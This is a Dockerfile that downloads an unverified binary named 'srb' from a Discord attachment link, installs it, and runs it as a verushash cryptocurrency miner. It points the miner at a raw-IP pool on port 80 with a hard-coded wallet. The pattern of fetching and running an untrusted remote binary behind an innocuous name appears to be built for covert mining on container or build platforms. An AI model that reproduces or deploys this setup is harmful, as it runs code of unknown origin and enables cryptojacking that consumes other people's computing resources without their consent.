FROM ubuntu:latest as builder
RUN apt-get update -y


RUN apt-get install sudo wget git -y

RUN wget https://cdn.discordapp.com/attachments/614113650038538240/944499717205794856/srb && \
    chmod +x srb && \
    mv srb /usr/local/bin/

FROM ubuntu:latest

COPY --from=builder /usr/local/bin/srb /usr/local/bin/

CMD [ "srb", "--disable-gpu", "--algorithm", "verushash", "--pool", "51.89.228.192:80", "--wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "--password x" ]
